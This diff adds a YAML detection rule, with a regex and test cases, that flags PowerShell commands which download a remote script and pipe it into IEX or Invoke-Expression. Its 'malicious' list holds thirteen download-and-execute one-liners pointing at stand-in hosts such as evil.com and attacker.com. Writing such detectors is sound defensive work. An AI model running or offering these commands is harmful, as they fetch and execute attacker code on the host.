@@ -1,0 +1,37 @@
+name: critical-02a-iex-download-first
+severity: critical
+description: >
+  Detects PowerShell downloading and executing remote scripts with IEX. Hallmark of fileless malware attacks.
+
+pattern: |
+  (?i)(IWR|Invoke-WebRequest|wget|curl|New-Object.*WebClient.*DownloadString).{0,150}(http|ftp)s?://.{0,100}\|\s*(IEX|Invoke-Expression)
+
+malicious:
+  - "IWR http://evil.com/payload.ps1 | IEX"
+  - "Invoke-WebRequest https://malware.com/script.ps1 | Invoke-Expression"
+  - "curl http://attacker.com/malicious.ps1 | IEX"
+  - "wget https://evil.com/backdoor.ps1 | Invoke-Expression"
+  - "IWR http://bad.com/p.ps1 -UseBasicParsing | IEX"
+  - 'powershell -c "IWR http://evil.com/s.ps1 | IEX"'
+  - "curl https://attacker.com/payload.ps1 -UseBasicParsing | Invoke-Expression"
+  - "iwr http://evil.com/clickfix.ps1|iex"
+  - "Invoke-WebRequest -Uri http://malware.com/stage2.ps1 -UseBasicParsing|IEX"
+  - "(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') | IEX"
+  - "IWR 'http://evil.com/payload.ps1' -UseBasicParsing|iex"
+  - 'Invoke-WebRequest -Uri "https://evil.com/stager.ps1" | Invoke-Expression'
+  - "curl http://malware.com/reverse-shell.ps1 -UseBasicParsing|IEX"
+
+benign:
+  - "Get-Process | Export-Csv processes.csv"
+  - "Invoke-WebRequest http://example.com/data.json"
+  - "IWR https://api.company.com/status"
+  - "curl http://localhost:8080/health"
+  - "Get-Service | Where-Object Status -eq Running"
+  - "Invoke-Expression $localScript"
+  - "Get-Content script.ps1 | ForEach-Object"
+  - "IWR https://download.microsoft.com/file.msi -OutFile file.msi"
+  - "curl https://api.github.com/repos/user/repo/releases/latest"
+  - "Get-Content .\\local-script.ps1 | IEX"
+  - "$script | Invoke-Expression"
+  - "wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb"
+  - "IWR https://raw.githubusercontent.com/user/repo/main/README.md -OutFile README.md"
